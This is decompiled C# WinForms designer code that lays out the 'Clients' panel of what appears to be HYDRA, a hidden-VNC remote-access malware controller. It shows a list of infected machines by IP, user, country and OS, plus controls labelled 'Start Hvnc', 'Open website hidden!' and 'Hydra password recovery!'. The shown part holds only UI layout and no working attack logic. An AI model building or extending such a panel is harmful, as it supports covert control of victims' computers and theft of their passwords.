			this.bunifuIconButton2.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges6.BottomLeft = true;
			borderEdges6.BottomRight = true;
			borderEdges6.TopLeft = true;
			borderEdges6.TopRight = true;
			this.bunifuIconButton2.CustomizableEdges = borderEdges6;
			this.bunifuIconButton2.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton2.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton2.Image");
			this.bunifuIconButton2.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton2.Location = new System.Drawing.Point(53, 17);
			this.bunifuIconButton2.Name = "bunifuIconButton2";
			this.bunifuIconButton2.RoundBorders = false;
			this.bunifuIconButton2.ShowBorders = true;
			this.bunifuIconButton2.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton2.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton2.TabIndex = 7;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton2, "Open website hidden!");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton2, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton2, "HYDRA");
			this.bunifuIconButton2.Click += new System.EventHandler(btnVisitUrl_Click);
			this.bunifuIconButton1.AllowAnimations = true;
			this.bunifuIconButton1.AllowBorderColorChanges = true;
			this.bunifuIconButton1.AllowMouseEffects = true;
			this.bunifuIconButton1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.bunifuIconButton1.AnimationSpeed = 200;
			this.bunifuIconButton1.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton1.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton1.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton1.BorderRadius = 1;
			this.bunifuIconButton1.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton1.BorderThickness = 1;
			this.bunifuIconButton1.ColorContrastOnClick = 30;
			this.bunifuIconButton1.ColorContrastOnHover = 30;
			this.bunifuIconButton1.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges7.BottomLeft = true;
			borderEdges7.BottomRight = true;
			borderEdges7.TopLeft = true;
			borderEdges7.TopRight = true;
			this.bunifuIconButton1.CustomizableEdges = borderEdges7;
			this.bunifuIconButton1.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton1.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton1.Image");
			this.bunifuIconButton1.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton1.Location = new System.Drawing.Point(94, 17);
			this.bunifuIconButton1.Name = "bunifuIconButton1";
			this.bunifuIconButton1.RoundBorders = false;
			this.bunifuIconButton1.ShowBorders = true;
			this.bunifuIconButton1.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton1.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton1.TabIndex = 6;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton1, "Hydra password recovery!");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton1, "HYDRA");
			this.bunifuIconButton1.Click += new System.EventHandler(btnRecover_Click);
			this.btnTelegram.AllowAnimations = true;
			this.btnTelegram.AllowBorderColorChanges = true;
			this.btnTelegram.AllowMouseEffects = true;
			this.btnTelegram.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.btnTelegram.AnimationSpeed = 200;
			this.btnTelegram.BackColor = System.Drawing.Color.Transparent;
			this.btnTelegram.BackgroundColor = System.Drawing.Color.Transparent;
			this.btnTelegram.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.btnTelegram.BorderRadius = 1;
			this.btnTelegram.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.btnTelegram.BorderThickness = 1;
			this.btnTelegram.ColorContrastOnClick = 30;
			this.btnTelegram.ColorContrastOnHover = 30;
			this.btnTelegram.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges8.BottomLeft = true;
			borderEdges8.BottomRight = true;
			borderEdges8.TopLeft = true;
			borderEdges8.TopRight = true;
			this.btnTelegram.CustomizableEdges = borderEdges8;
			this.btnTelegram.DialogResult = System.Windows.Forms.DialogResult.None;
			this.btnTelegram.Image = (System.Drawing.Image)resources.GetObject("btnTelegram.Image");
			this.btnTelegram.ImageMargin = new System.Windows.Forms.Padding(0);
			this.btnTelegram.Location = new System.Drawing.Point(135, 17);
			this.btnTelegram.Name = "btnTelegram";
			this.btnTelegram.RoundBorders = false;
			this.btnTelegram.ShowBorders = true;
			this.btnTelegram.Size = new System.Drawing.Size(35, 35);
			this.btnTelegram.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.btnTelegram.TabIndex = 5;
			this.bunifuToolTip1.SetToolTip(this.btnTelegram, "Unnistall!");
			this.bunifuToolTip1.SetToolTipIcon(this.btnTelegram, null);
			this.bunifuToolTip1.SetToolTipTitle(this.btnTelegram, "HYDRA");
			this.btnTelegram.Click += new System.EventHandler(btnRemoveHvnc_Click);
			this.imageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList1.ImageStream");
			this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
			this.imageList1.Images.SetKeyName(0, "ad.png");
			this.imageList1.Images.SetKeyName(1, "ae.png");
			this.imageList1.Images.SetKeyName(2, "af.png");
			this.imageList1.Images.SetKeyName(3, "ag.png");
			this.imageList1.Images.SetKeyName(4, "ai.png");
			this.imageList1.Images.SetKeyName(5, "al.png");
			this.imageList1.Images.SetKeyName(6, "am.png");
			this.imageList1.Images.SetKeyName(7, "an.png");
			this.imageList1.Images.SetKeyName(8, "ao.png");
			this.imageList1.Images.SetKeyName(9, "ar.png");
			this.imageList1.Images.SetKeyName(10, "as.png");
			this.imageList1.Images.SetKeyName(11, "at.png");
			this.imageList1.Images.SetKeyName(12, "au.png");
			this.imageList1.Images.SetKeyName(13, "aw.png");
			this.imageList1.Images.SetKeyName(14, "ax.png");
			this.imageList1.Images.SetKeyName(15, "az.png");
			this.imageList1.Images.SetKeyName(16, "ba.png");
			this.imageList1.Images.SetKeyName(17, "bb.png");
			this.imageList1.Images.SetKeyName(18, "bd.png");
			this.imageList1.Images.SetKeyName(19, "be.png");
			this.imageList1.Images.SetKeyName(20, "bf.png");
			this.imageList1.Images.SetKeyName(21, "bg.png");
			this.imageList1.Images.SetKeyName(22, "bh.png");
			this.imageList1.Images.SetKeyName(23, "bi.png");
			this.imageList1.Images.SetKeyName(24, "bj.png");
			this.imageList1.Images.SetKeyName(25, "bm.png");
			this.imageList1.Images.SetKeyName(26, "bn.png");
			this.imageList1.Images.SetKeyName(27, "bo.png");
			this.imageList1.Images.SetKeyName(28, "br.png");
			this.imageList1.Images.SetKeyName(29, "bs.png");
			this.imageList1.Images.SetKeyName(30, "bt.png");
			this.imageList1.Images.SetKeyName(31, "bv.png");
			this.imageList1.Images.SetKeyName(32, "bw.png");
			this.imageList1.Images.SetKeyName(33, "by.png");
			this.imageList1.Images.SetKeyName(34, "bz.png");
			this.imageList1.Images.SetKeyName(35, "ca.png");
			this.imageList1.Images.SetKeyName(36, "catalonia.png");
			this.imageList1.Images.SetKeyName(37, "cc.png");
			this.imageList1.Images.SetKeyName(38, "cd.png");
			this.imageList1.Images.SetKeyName(39, "cf.png");
			this.imageList1.Images.SetKeyName(40, "cg.png");
			this.imageList1.Images.SetKeyName(41, "ch.png");
			this.imageList1.Images.SetKeyName(42, "ci.png");
			this.imageList1.Images.SetKeyName(43, "ck.png");
			this.imageList1.Images.SetKeyName(44, "cl.png");
			this.imageList1.Images.SetKeyName(45, "cm.png");
			this.imageList1.Images.SetKeyName(46, "cn.png");
			this.imageList1.Images.SetKeyName(47, "co.png");
			this.imageList1.Images.SetKeyName(48, "cr.png");
			this.imageList1.Images.SetKeyName(49, "cs.png");
			this.imageList1.Images.SetKeyName(50, "cu.png");
			this.imageList1.Images.SetKeyName(51, "cv.png");
			this.imageList1.Images.SetKeyName(52, "cx.png");
			this.imageList1.Images.SetKeyName(53, "cy.png");
			this.imageList1.Images.SetKeyName(54, "cz.png");
			this.imageList1.Images.SetKeyName(55, "de.png");
			this.imageList1.Images.SetKeyName(56, "dj.png");
			this.imageList1.Images.SetKeyName(57, "dk.png");
			this.imageList1.Images.SetKeyName(58, "dm.png");
			this.imageList1.Images.SetKeyName(59, "do.png");
			this.imageList1.Images.SetKeyName(60, "dz.png");
			this.imageList1.Images.SetKeyName(61, "ec.png");
			this.imageList1.Images.SetKeyName(62, "ee.png");
			this.imageList1.Images.SetKeyName(63, "eg.png");
			this.imageList1.Images.SetKeyName(64, "eh.png");
			this.imageList1.Images.SetKeyName(65, "england.png");
			this.imageList1.Images.SetKeyName(66, "er.png");
			this.imageList1.Images.SetKeyName(67, "es.png");
			this.imageList1.Images.SetKeyName(68, "et.png");
			this.imageList1.Images.SetKeyName(69, "europeanunion.png");
			this.imageList1.Images.SetKeyName(70, "fam.png");
			this.imageList1.Images.SetKeyName(71, "fi.png");
			this.imageList1.Images.SetKeyName(72, "fj.png");
			this.imageList1.Images.SetKeyName(73, "fk.png");
			this.imageList1.Images.SetKeyName(74, "fm.png");
			this.imageList1.Images.SetKeyName(75, "fo.png");
			this.imageList1.Images.SetKeyName(76, "fr.png");
			this.imageList1.Images.SetKeyName(77, "ga.png");
			this.imageList1.Images.SetKeyName(78, "gb.png");
			this.imageList1.Images.SetKeyName(79, "gd.png");
			this.imageList1.Images.SetKeyName(80, "ge.png");
			this.imageList1.Images.SetKeyName(81, "gf.png");
			this.imageList1.Images.SetKeyName(82, "gh.png");
			this.imageList1.Images.SetKeyName(83, "gi.png");
			this.imageList1.Images.SetKeyName(84, "gl.png");
			this.imageList1.Images.SetKeyName(85, "gm.png");
			this.imageList1.Images.SetKeyName(86, "gn.png");
			this.imageList1.Images.SetKeyName(87, "gp.png");
			this.imageList1.Images.SetKeyName(88, "gq.png");
			this.imageList1.Images.SetKeyName(89, "gr.png");
			this.imageList1.Images.SetKeyName(90, "gs.png");
			this.imageList1.Images.SetKeyName(91, "gt.png");
			this.imageList1.Images.SetKeyName(92, "gu.png");
			this.imageList1.Images.SetKeyName(93, "gw.png");
			this.imageList1.Images.SetKeyName(94, "gy.png");
			this.imageList1.Images.SetKeyName(95, "hk.png");
			this.imageList1.Images.SetKeyName(96, "hm.png");
			this.imageList1.Images.SetKeyName(97, "hn.png");
			this.imageList1.Images.SetKeyName(98, "hr.png");
			this.imageList1.Images.SetKeyName(99, "ht.png");
			this.imageList1.Images.SetKeyName(100, "hu.png");
			this.imageList1.Images.SetKeyName(101, "id.png");
			this.imageList1.Images.SetKeyName(102, "ie.png");
			this.imageList1.Images.SetKeyName(103, "il.png");
			this.imageList1.Images.SetKeyName(104, "in.png");
			this.imageList1.Images.SetKeyName(105, "io.png");
			this.imageList1.Images.SetKeyName(106, "iq.png");
			this.imageList1.Images.SetKeyName(107, "ir.png");
			this.imageList1.Images.SetKeyName(108, "is.png");
			this.imageList1.Images.SetKeyName(109, "it.png");
			this.imageList1.Images.SetKeyName(110, "jm.png");
			this.imageList1.Images.SetKeyName(111, "jo.png");
			this.imageList1.Images.SetKeyName(112, "jp.png");
			this.imageList1.Images.SetKeyName(113, "ke.png");
			this.imageList1.Images.SetKeyName(114, "kg.png");
			this.imageList1.Images.SetKeyName(115, "kh.png");
			this.imageList1.Images.SetKeyName(116, "ki.png");
			this.imageList1.Images.SetKeyName(117, "km.png");
			this.imageList1.Images.SetKeyName(118, "kn.png");
			this.imageList1.Images.SetKeyName(119, "kp.png");
			this.imageList1.Images.SetKeyName(120, "kr.png");
			this.imageList1.Images.SetKeyName(121, "kw.png");
			this.imageList1.Images.SetKeyName(122, "ky.png");
			this.imageList1.Images.SetKeyName(123, "kz.png");
			this.imageList1.Images.SetKeyName(124, "la.png");
			this.imageList1.Images.SetKeyName(125, "lb.png");
			this.imageList1.Images.SetKeyName(126, "lc.png");
			this.imageList1.Images.SetKeyName(127, "li.png");
			this.imageList1.Images.SetKeyName(128, "lk.png");
			this.imageList1.Images.SetKeyName(129, "lr.png");
			this.imageList1.Images.SetKeyName(130, "ls.png");
			this.imageList1.Images.SetKeyName(131, "lt.png");
			this.imageList1.Images.SetKeyName(132, "lu.png");
			this.imageList1.Images.SetKeyName(133, "lv.png");
			this.imageList1.Images.SetKeyName(134, "ly.png");
			this.imageList1.Images.SetKeyName(135, "ma.png");
			this.imageList1.Images.SetKeyName(136, "mc.png");
			this.imageList1.Images.SetKeyName(137, "md.png");
			this.imageList1.Images.SetKeyName(138, "me.png");
			this.imageList1.Images.SetKeyName(139, "mg.png");
			this.imageList1.Images.SetKeyName(140, "mh.png");
			this.imageList1.Images.SetKeyName(141, "mk.png");
			this.imageList1.Images.SetKeyName(142, "ml.png");
			this.imageList1.Images.SetKeyName(143, "mm.png");
			this.imageList1.Images.SetKeyName(144, "mn.png");
			this.imageList1.Images.SetKeyName(145, "mo.png");
			this.imageList1.Images.SetKeyName(146, "mp.png");
			this.imageList1.Images.SetKeyName(147, "mq.png");
			this.imageList1.Images.SetKeyName(148, "mr.png");
			this.imageList1.Images.SetKeyName(149, "ms.png");
			this.imageList1.Images.SetKeyName(150, "mt.png");
			this.imageList1.Images.SetKeyName(151, "mu.png");
			this.imageList1.Images.SetKeyName(152, "mv.png");
			this.imageList1.Images.SetKeyName(153, "mw.png");
			this.imageList1.Images.SetKeyName(154, "mx.png");
			this.imageList1.Images.SetKeyName(155, "my.png");
			this.imageList1.Images.SetKeyName(156, "mz.png");
			this.imageList1.Images.SetKeyName(157, "na.png");
			this.imageList1.Images.SetKeyName(158, "nc.png");
			this.imageList1.Images.SetKeyName(159, "ne.png");
			this.imageList1.Images.SetKeyName(160, "nf.png");
			this.imageList1.Images.SetKeyName(161, "ng.png");
			this.imageList1.Images.SetKeyName(162, "ni.png");
			this.imageList1.Images.SetKeyName(163, "nl.png");
			this.imageList1.Images.SetKeyName(164, "no.png");
			this.imageList1.Images.SetKeyName(165, "np.png");
			this.imageList1.Images.SetKeyName(166, "nr.png");
			this.imageList1.Images.SetKeyName(167, "nu.png");
			this.imageList1.Images.SetKeyName(168, "nz.png");
			this.imageList1.Images.SetKeyName(169, "om.png");
			this.imageList1.Images.SetKeyName(170, "pa.png");
			this.imageList1.Images.SetKeyName(171, "pe.png");
			this.imageList1.Images.SetKeyName(172, "pf.png");
			this.imageList1.Images.SetKeyName(173, "pg.png");
			this.imageList1.Images.SetKeyName(174, "ph.png");
			this.imageList1.Images.SetKeyName(175, "pk.png");
			this.imageList1.Images.SetKeyName(176, "pl.png");
			this.imageList1.Images.SetKeyName(177, "pm.png");
			this.imageList1.Images.SetKeyName(178, "pn.png");
			this.imageList1.Images.SetKeyName(179, "pr.png");
			this.imageList1.Images.SetKeyName(180, "ps.png");
			this.imageList1.Images.SetKeyName(181, "pt.png");
			this.imageList1.Images.SetKeyName(182, "pw.png");
			this.imageList1.Images.SetKeyName(183, "py.png");
			this.imageList1.Images.SetKeyName(184, "qa.png");
			this.imageList1.Images.SetKeyName(185, "re.png");
			this.imageList1.Images.SetKeyName(186, "ro.png");
			this.imageList1.Images.SetKeyName(187, "rs.png");
			this.imageList1.Images.SetKeyName(188, "ru.png");
			this.imageList1.Images.SetKeyName(189, "rw.png");
			this.imageList1.Images.SetKeyName(190, "sa.png");
			this.imageList1.Images.SetKeyName(191, "sb.png");
			this.imageList1.Images.SetKeyName(192, "sc.png");
			this.imageList1.Images.SetKeyName(193, "scotland.png");
			this.imageList1.Images.SetKeyName(194, "sd.png");
			this.imageList1.Images.SetKeyName(195, "se.png");
			this.imageList1.Images.SetKeyName(196, "sg.png");
			this.imageList1.Images.SetKeyName(197, "sh.png");
			this.imageList1.Images.SetKeyName(198, "si.png");
			this.imageList1.Images.SetKeyName(199, "sj.png");
			this.imageList1.Images.SetKeyName(200, "sk.png");
			this.imageList1.Images.SetKeyName(201, "sl.png");
			this.imageList1.Images.SetKeyName(202, "sm.png");
			this.imageList1.Images.SetKeyName(203, "sn.png");
			this.imageList1.Images.SetKeyName(204, "so.png");
			this.imageList1.Images.SetKeyName(205, "sr.png");
			this.imageList1.Images.SetKeyName(206, "st.png");
			this.imageList1.Images.SetKeyName(207, "sv.png");
			this.imageList1.Images.SetKeyName(208, "sy.png");
			this.imageList1.Images.SetKeyName(209, "sz.png");
			this.imageList1.Images.SetKeyName(210, "tc.png");
			this.imageList1.Images.SetKeyName(211, "td.png");
			this.imageList1.Images.SetKeyName(212, "tf.png");
			this.imageList1.Images.SetKeyName(213, "tg.png");
			this.imageList1.Images.SetKeyName(214, "th.png");
			this.imageList1.Images.SetKeyName(215, "tj.png");
			this.imageList1.Images.SetKeyName(216, "tk.png");
			this.imageList1.Images.SetKeyName(217, "tl.png");
			this.imageList1.Images.SetKeyName(218, "tm.png");
			this.imageList1.Images.SetKeyName(219, "tn.png");
			this.imageList1.Images.SetKeyName(220, "to.png");
			this.imageList1.Images.SetKeyName(221, "tr.png");
			this.imageList1.Images.SetKeyName(222, "tt.png");
			this.imageList1.Images.SetKeyName(223, "tv.png");
			this.imageList1.Images.SetKeyName(224, "tw.png");
			this.imageList1.Images.SetKeyName(225, "tz.png");
			this.imageList1.Images.SetKeyName(226, "ua.png");
			this.imageList1.Images.SetKeyName(227, "ug.png");
			this.imageList1.Images.SetKeyName(228, "um.png");
			this.imageList1.Images.SetKeyName(229, "us.png");
			this.imageList1.Images.SetKeyName(230, "uy.png");
			this.imageList1.Images.SetKeyName(231, "uz.png");
			this.imageList1.Images.SetKeyName(232, "va.png");
			this.imageList1.Images.SetKeyName(233, "vc.png");
			this.imageList1.Images.SetKeyName(234, "ve.png");
			this.imageList1.Images.SetKeyName(235, "vg.png");
			this.imageList1.Images.SetKeyName(236, "vi.png");
			this.imageList1.Images.SetKeyName(237, "vn.png");
			this.imageList1.Images.SetKeyName(238, "vu.png");
			this.imageList1.Images.SetKeyName(239, "wales.png");
			this.imageList1.Images.SetKeyName(240, "wf.png");
			this.imageList1.Images.SetKeyName(241, "ws.png");
			this.imageList1.Images.SetKeyName(242, "ye.png");
			this.imageList1.Images.SetKeyName(243, "yt.png");
			this.imageList1.Images.SetKeyName(244, "za.png");
			this.imageList1.Images.SetKeyName(245, "zm.png");
			this.imageList1.Images.SetKeyName(246, "zw.png");
			this.imageList2.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList2.ImageStream");
			this.imageList2.TransparentColor = System.Drawing.Color.Transparent;
			this.imageList2.Images.SetKeyName(0, "stop_48px.png");
			this.imageList2.Images.SetKeyName(1, "play_48px.png");
			this.timer1.Tick += new System.EventHandler(timer_Tick);
			this.pRAM.CategoryName = "Memory";
			this.pRAM.CounterName = "% Committed Bytes In Use";
			this.pCPU.CategoryName = "Processor";
			this.pCPU.CounterName = "% Processor Time";
			this.pCPU.InstanceName = "_Total";
			this.columnHeader1.Text = "Identifier";
			this.columnHeader1.Width = 85;
			this.columnHeader2.Text = "IP / DNS";
			this.columnHeader2.Width = 141;
			this.columnHeader3.Text = "User@PC";
			this.columnHeader3.Width = 155;
			this.columnHeader4.Text = "Country";
			this.columnHeader4.Width = 100;
			this.columnHeader5.Text = "Operationg System";
			this.columnHeader5.Width = 198;
			this.columnHeader6.Text = "Install Date";
			this.columnHeader6.Width = 153;
			this.columnHeader7.Text = "Version";
			this.columnHeader7.Width = 82;
			this.HVNCList.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.HVNCList.BorderStyle = System.Windows.Forms.BorderStyle.None;
			this.HVNCList.Columns.AddRange(new System.Windows.Forms.ColumnHeader[7] { this.columnHeader1, this.columnHeader2, this.columnHeader3, this.columnHeader4, this.columnHeader5, this.columnHeader6, this.columnHeader7 });
			this.HVNCList.ContextMenuStrip = this.guna2ContextMenuStrip1;
			this.HVNCList.Dock = System.Windows.Forms.DockStyle.Fill;
			this.HVNCList.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.HVNCList.FullRowSelect = true;
			this.HVNCList.HideSelection = false;
			this.HVNCList.Location = new System.Drawing.Point(0, 0);
			this.HVNCList.Name = "HVNCList";
			this.HVNCList.Size = new System.Drawing.Size(1123, 452);
			this.HVNCList.TabIndex = 2;
			this.bunifuToolTip1.SetToolTip(this.HVNCList, "");
			this.bunifuToolTip1.SetToolTipIcon(this.HVNCList, null);
			this.bunifuToolTip1.SetToolTipTitle(this.HVNCList, "");
			this.HVNCList.UseCompatibleStateImageBehavior = false;
			this.HVNCList.View = System.Windows.Forms.View.Details;
			this.HVNCList.DoubleClick += new System.EventHandler(HVNCList_DoubleClick);
			this.guna2ContextMenuStrip1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.guna2ContextMenuStrip1.Font = new System.Drawing.Font("Century Gothic", 9.75f);
			this.guna2ContextMenuStrip1.ImageScalingSize = new System.Drawing.Size(19, 19);
			this.guna2ContextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.systemMassageToolStripMenuItem, this.remoteTerminalToolStripMenuItem });
			this.guna2ContextMenuStrip1.Name = "guna2ContextMenuStrip1";
			this.guna2ContextMenuStrip1.RenderStyle.ArrowColor = System.Drawing.Color.Gainsboro;
			this.guna2ContextMenuStrip1.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ContextMenuStrip1.RenderStyle.ColorTable = null;
			this.guna2ContextMenuStrip1.RenderStyle.RoundedEdges = true;
			this.guna2ContextMenuStrip1.RenderStyle.SelectionArrowColor = System.Drawing.Color.WhiteSmoke;
			this.guna2ContextMenuStrip1.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ContextMenuStrip1.RenderStyle.SelectionForeColor = System.Drawing.Color.Black;
			this.guna2ContextMenuStrip1.RenderStyle.SeparatorColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.guna2ContextMenuStrip1.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
			this.guna2ContextMenuStrip1.Size = new System.Drawing.Size(184, 78);
			this.bunifuToolTip1.SetToolTip(this.guna2ContextMenuStrip1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.guna2ContextMenuStrip1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.guna2ContextMenuStrip1, "");
			this.systemMassageToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.systemMassageToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("systemMassageToolStripMenuItem.Image");
			this.systemMassageToolStripMenuItem.Name = "systemMassageToolStripMenuItem";
			this.systemMassageToolStripMenuItem.Size = new System.Drawing.Size(183, 26);
			this.systemMassageToolStripMenuItem.Text = "Start Hvnc";
			this.systemMassageToolStripMenuItem.Click += new System.EventHandler(systemMassageToolStripMenuItem_Click);
			this.remoteTerminalToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.remoteTerminalToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("remoteTerminalToolStripMenuItem.Image");
			this.remoteTerminalToolStripMenuItem.Name = "remoteTerminalToolStripMenuItem";
			this.remoteTerminalToolStripMenuItem.Size = new System.Drawing.Size(183, 26);
			this.remoteTerminalToolStripMenuItem.Text = "Back to Clients";
			this.remoteTerminalToolStripMenuItem.Visible = false;
			this.remoteTerminalToolStripMenuItem.Click += new System.EventHandler(remoteTerminalToolStripMenuItem_Click);
			this.bunifuToolTip1.Active = true;
			this.bunifuToolTip1.AlignTextWithTitle = false;
			this.bunifuToolTip1.AllowAutoClose = false;
			this.bunifuToolTip1.AllowFading = true;
			this.bunifuToolTip1.AutoCloseDuration = 5000;
			this.bunifuToolTip1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuToolTip1.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuToolTip1.ClickToShowDisplayControl = false;
			this.bunifuToolTip1.ConvertNewlinesToBreakTags = true;
			this.bunifuToolTip1.DisplayControl = null;
			this.bunifuToolTip1.EntryAnimationSpeed = 350;
			this.bunifuToolTip1.ExitAnimationSpeed = 200;
			this.bunifuToolTip1.GenerateAutoCloseDuration = false;
			this.bunifuToolTip1.IconMargin = 6;
			this.bunifuToolTip1.InitialDelay = 0;
			this.bunifuToolTip1.Name = "bunifuToolTip1";
			this.bunifuToolTip1.Opacity = 1.0;
			this.bunifuToolTip1.OverrideToolTipTitles = false;
			this.bunifuToolTip1.Padding = new System.Windows.Forms.Padding(10);
			this.bunifuToolTip1.ReshowDelay = 100;
			this.bunifuToolTip1.ShowAlways = true;
			this.bunifuToolTip1.ShowBorders = false;
			this.bunifuToolTip1.ShowIcons = true;
			this.bunifuToolTip1.ShowShadows = true;
			this.bunifuToolTip1.Tag = null;
			this.bunifuToolTip1.TextFont = new System.Drawing.Font("Century Gothic", 9f);
			this.bunifuToolTip1.TextForeColor = System.Drawing.Color.White;
			this.bunifuToolTip1.TextMargin = 2;
			this.bunifuToolTip1.TitleFont = new System.Drawing.Font("Century Gothic", 9f, System.Drawing.FontStyle.Bold);
			this.bunifuToolTip1.TitleForeColor = System.Drawing.Color.DarkGray;
			this.bunifuToolTip1.ToolTipPosition = new System.Drawing.Point(0, 0);
			this.bunifuToolTip1.ToolTipTitle = null;
			base.AutoScaleDimensions = new System.Drawing.SizeF(7f, 15f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(1123, 519);
			base.Controls.Add(this.HVNCList);
			base.Controls.Add(this.panel1);
			this.Font = new System.Drawing.Font("Century Gothic", 8.25f, System.Drawing.FontStyle.Bold);
			this.ForeColor = System.Drawing.Color.WhiteSmoke;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "Clients";
			this.Text = "Clients";
			base.Load += new System.EventHandler(Clients_Load);
			this.panel1.ResumeLayout(false);
			this.panel1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)this.pRAM).EndInit();
			((System.ComponentModel.ISupportInitialize)this.pCPU).EndInit();
			this.guna2ContextMenuStrip1.ResumeLayout(false);
			base.ResumeLayout(false);
		}
	}
}
